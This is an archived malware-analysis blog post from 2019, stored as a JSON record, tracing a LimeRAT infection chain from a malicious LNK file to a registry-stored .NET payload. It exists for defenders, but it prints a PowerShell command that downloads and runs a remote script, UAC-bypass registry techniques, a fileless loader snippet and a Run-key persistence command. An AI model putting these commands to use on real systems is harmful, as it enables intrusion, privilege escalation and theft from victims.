{
    "id": "6d439fa2-d0be-484f-96b4-4add2146542d",
    "created_at": "2023-01-12T15:00:33.665893Z",
    "updated_at": "2025-03-27T02:05:32.822771Z",
    "deleted_at": null,
    "sha1_hash": "06b6b86fa89c4c4cbad97a9c14f47428cd32e35e",
    "title": "2019-04-09 - LimeRAT spreads in the wild",
    "authors": "",
    "file_creation_date": "2022-05-28T15:43:19Z",
    "file_modification_date": "2022-05-28T15:43:19Z",
    "file_size": 162635,
    "plain_text": "# LimeRAT spreads in the wild\n\n**[blog.yoroi.company/research/limerat-spreads-in-the-wild/](https://blog.yoroi.company/research/limerat-spreads-in-the-wild/)**\n\n04/09/2019\n\n## Introduction\n\n\nApril 9, 2019\n\n\nFew days ago, Cybaze-Yoroi ZLab team came across an interesting infection chain\nleveraging several techniques able to defeat traditional security defences and hiding a\npowerful inner payload able to seriously threaten its victims.\n\n\n-----\n\nThe whole infection chain was originated by a LNK file, a technique used by advanced\nattackers and APTs too, for this reason we decided to have a deeper look into these\nmalicious samples revealing another infamous abuse of open-source projects. Too many\ntimes turned into fully-featured malware implants by unethical hackers and cyber criminals.\n\n## Technical Analysis\n\nThe origin of the infection chain is a simple LNK file, a technique originally adopted by state\nsponsored and advanced actors, designed to download and run a powershell file named\n“rdp.ps1” from a remote location through the command:\n```\nC:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -ExecutionPolicy Bypass Windo 1 $wm=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aWVY'));sal\ng $wm;$IF=((New-Object\nNet.WebClient)).DownloadString('https://hacks4all[.net/rdp.ps1');g $I\n\n```\nThe retrieved Powershell script works as dropper of the whole infection chain.\n\n**Sha256** 141fd1e267a092d5525ba91b5817c324ccd9ec20a0d5c6b5cdfb899ca5cda039\n\n**Threat** Powershell Dropper\n\n\n**Brief**\n**Description**\n\n\nPowershell dropper of LimeRAT\n\n\n**Ssdeep** 1536:7Tty9ugHMeQdOaqZyyhWI6WGf6J705549G:7Ti2dOaqZyyhp8fQkCG\n\nThis script firstly retrieves the version of the Windows OS installed on the target machine\nusing the “Get-WmiObject -Class Win32_OperatingSystem | Select-Object -ExpandProperty\nVersion” command. Then, depending on the returned value, it runs a couple of privilege\nescalation exploits able to bypass the UAC (User Account Control) feature, a well known\nsecurity mechanism introduced since Vista to avoid unauthorized system configuration\nchanges. The first one targets the Windows versions lower than 8.1, abusing a design flaw\non the [EventViewer process to execute a command with higher privileges.](https://enigma0x3.net/2016/08/15/fileless-uac-bypass-using-eventvwr-exe-and-registry-hijacking/)\n\nThis exploit works quite easily: the malware gains access to the registry key\n“HKCU:\\Software\\Classes\\mscfile\\shell\\open\\command” and inserts here the command to\nrun its own payload, forcing its execution through the “eventvwr.exe” process which, due to a\nsecurity flaw, executes it with the maximum privileges available.\n\nFigure 1: Check of the target Windows version and preparation for the eventvwr.exe process\nexploit\nThe second exploit targets Windows 10 operating systems: it leverages a vulnerability inside\nthe [FODhelper process. The principle of this exploit is similar to the previous one, but the](https://winscripting.blog/2017/05/12/first-entry-welcome-and-uac-bypass/)\naccessed registry key is “HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command” and\nthe vulnerable process is “fodhelper.exe”.\n\n\n-----\n\nFigure 2: Check of the target Windows version and preparation for the fodhelper.exe process\nexploit\nThese two exploits are both used to run a Powershell payload which, after its decoding,\nresults in the invocation of an additional JavaScript code. The body of this script contains a\nunique anonymous function embedding other sub-functions and an enormous obfuscated\nvariable.\n\nFigure 3: Payload encoded in Base64 format and obfuscated with a custom subroutine\nFigure 4: Piece of de-obfuscation subroutine\nIts payload is a parameterized Powershell script having the purpose to install the final\npayload into the user registry hive, concluding the infection chain.\n```\n[\n \"Wscript.Shell\",\n \"scriptfullname\",\n \"scriptname\",\n \"powershell -ExecutionPolicy Bypass -windowstyle hidden -noexit -Command \",\n \"%\",\n \"ExpandEnvironmentStrings\",\n \"Temp\",\n \"\\\\\",\n \"fromCharCode\",\n \"[System.IO.File]::WriteAllText([Environment]::GetEnvironmentVariable('Temp')+'\\\\\",\n \"',[System.IO.File]::ReadAllText('\",\n \"'));wscript '\",\n \"'\",\n \"Run\",\n \"Quit\",\n \"New-ItemProperty -Path 'HKCU:\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run'\n-name 'FileName' -value '\",\n \"' -PropertyType String -Force;\",\n \"[System.IO.File]::WriteAllText([Environment]::GetFolderPath(7)+'\\\\\",\n \"'))\",\n \" ##### FINAL PAYLOAD ##### \"\n \"HKCU\\\\SOFTWARE\\\\Microsoft\\\\\\\\Winkey\",\n \"Scripting.FileSystemObject\",\n \"REG_SZ\",\n \"regwrite\",\n \"$_b = (get-itemproperty -path 'HKCU:\\\\SOFTWARE\\\\Microsoft\\\\' -name\n'Winkey').Winkey;$_b=$_b.replace('~','0');[byte[]]$_0 =\n[System.Convert]::FromBase64String($_b);$_1 =\n[System.Threading.Thread]::GetDomain().Load($_0);$_1.EntryPoint.invoke($null,$null);\"\n]\n\n```\nFigure 5: Final payload written in the registry key in base64 Format\n\n### The Payload\n\n\n-----\n\nFigure 6. Static payload data\n\nThe installed payload actually is a Base64 encoded PE32 file, file-lessly stored within the\nregistry hive to avoid antivirus detection. It is written in C# and requires at least the .NET\nframework 3.2 to run. Exploring the malware code, we detected multiple evidence indication\nof the possible belonging malware family: LimeRAT.\n\n[LimeRAT is a powerful Remote Administration Tool publicly available to any internet user, it is](https://github.com/NYAN-x-CAT/Lime-RAT)\nan open-source project freely available on Github. Comparing its source code to the\ndecompiled sample we were able to confirm there is a high compatibility between the\npayload and this open-source remote administration tool.\n\nFigure 7: Decompiled code (on the left) and source code (on the right) on Github platform\nThe function reported above closely matches the open-source code. It also codes an\ninteresting feature of the implant, in fact it allows the malware to register itself as “Critical\nProcess” and when the user tries to kill it, a Blue Screen of Death (BSoD) is raised on the\nvictim machine. Besides this peculiar tricks, the malware has a complete set of very powerful\nand dangerous capabilities, such as:\n\nUSB drive propagation, infecting all files and folders on USB drivers.\nEvasive startup methods (fileless) to avoid AV detection.\nVirtual machines and analysis box awareness to avoid detection.\nStealer and CryptoStealer module to steal cryptocurrency wallets and saved\npasswords.\nKeylogger module\nBackdoor and RDP access.\n\n### C2 Server\n\n\n-----\n\nFigure 8. C2 retrieval\n\nThe malware command and control infrastructure abuses the Pastebin service to ensure\nresilience, in fact the malware dynamically retrieves the real C2 destination address from a\npastie over an encrypted HTTPS channel.\n\nAlso, the attacker behind this sample leans on the Dynamic DNS service “warzonedns.com”,\npointing to the 213.183.58[.10 IP address located in Russia.\n\nInvestigating this network destination we figured out the registrar email,\n“anthony.marshall.1986[@gmail[.com”, is well known: this email appears in another\n[AdWind/JRat malicious campaign dated back in 2017, suggesting this malicious actor is](https://abuse.ch/blog/adwind-a-cross-plattform-rat/)\nactive for a long time.\n\n### Persistence Mechanisms\n\nThis sample also uses multiplepersistence mechanisms, making more difficult to an\nimprovised incident responder to get rid of the infection, because the choice to add this\nredundancy helps to ensure the infection last longer. In detail, it leverages at least three\ndifferent persistence tricks, copying itself in three different paths:\n\nC:\\Users\\admin\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\nC:\\Users\\public\\\n%APPDATA%\\Local\\Temp\\\n\nFigure 9: The persistence mechanisms of the malware\nThe JavaScript code is executed through the following powershell command:\n```\n\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -ExecutionPolicy Bypass windowstyle hidden -noexit -Command \"New-ItemProperty -Path\n'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -name 'FileName' -value\n'C:\\Users\\admin\\AppData\\Local\\Temp\\fuw.js' -PropertyType String -Force;\"\n\n```\n\n-----\n\n## Conclusion\n\nThe analyzed case evidences how open-source projects are often abused by cyber criminals\nto pursue their malicious objectives and, even if the malware code and behaviour are well\nknown, how those threat families are constantly re-arranged to avoid basic security controls,\nalong with the observation of how cyber-criminals challengingly insist in their illicit operations\nover the years, refining their techniques to penetrate companies boundaries.\n\n## Indicators of Compromise\n\nDropurl:\n\nhacks4all[.net/rdp.ps1\nComponents:\n\ne259df89e065c4162b273ebb18b75ea153f9bafe30a8c6610204ccf5e3f4ebcd\n141fd1e267a092d5525ba91b5817c324ccd9ec20a0d5c6b5cdfb899ca5cda039\nea755ec0455e91f9e218658b58962a0d6ce97c0c0940f0523042c23c0f20a10d\n194f608496f502a8cb2da017342b6b8b9e48ffa0e60f9c2052bff8fb98377eb6\nC2:\n\nhttps[://pastebin[.com/raw/8pGce3qE\nnetpipe[.warzonedns[.com[:21000\n213[.183[.58[.10\nPersistence:\n\nWrite the following registry keys:\n\n“%APPDATA%\\Local\\Temp”\n“C:\\Users\\public\\fuw”\n“%APPDATA%\\Roaming\\Microsoft\\Windows\\Start\nmenu\\programs\\startup\\fuw.js”\nHash:\n\ne259df89e065c4162b273ebb18b75ea153f9bafe30a8c6610204ccf5e3f4ebcd\n141fd1e267a092d5525ba91b5817c324ccd9ec20a0d5c6b5cdfb899ca5cda039\nea755ec0455e91f9e218658b58962a0d6ce97c0c0940f0523042c23c0f20a10d\n194f608496f502a8cb2da017342b6b8b9e48ffa0e60f9c2052bff8fb98377eb6\n\n### Yara Rules\n\n\n-----\n\n```\nrule LimeRat_201904 {\nmeta:\n     description = \"Yara rule for LimeRAT\"\n     author = \"Cybaze - Yoroi ZLab\"\n     last_updated = \"2019-04-08\"\n     tlp = \"white\"\n     category = \"informational\"\nstrings:\n     $a1 = { E5 A4 AA E5 AD AB E5 B0 87 }\n     $a2 = { 61 02 D2 0A 7C 04 69 02 }\n     $b = \"LimeRAT\" wide\ncondition:\n     all of them\n}\n\n```\n_This blog post was authored by Luigi Martire and Luca Mella of Cybaze-Yoroi Z-LAB_\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2019/2019-04-09 - LimeRAT spreads in the wild.pdf"
    ],
    "report_names": [
        "2019-04-09 - LimeRAT spreads in the wild.pdf"
    ],
    "threat_actors": [],
    "ts_created_at": 1673535633,
    "ts_updated_at": 1743041132,
    "ts_creation_date": 1653752599,
    "ts_modification_date": 1653752599,
    "files": {
        "pdf": "https://archive.orkl.eu/06b6b86fa89c4c4cbad97a9c14f47428cd32e35e.pdf",
        "text": "https://archive.orkl.eu/06b6b86fa89c4c4cbad97a9c14f47428cd32e35e.txt",
        "img": "https://archive.orkl.eu/06b6b86fa89c4c4cbad97a9c14f47428cd32e35e.jpg"
    }
}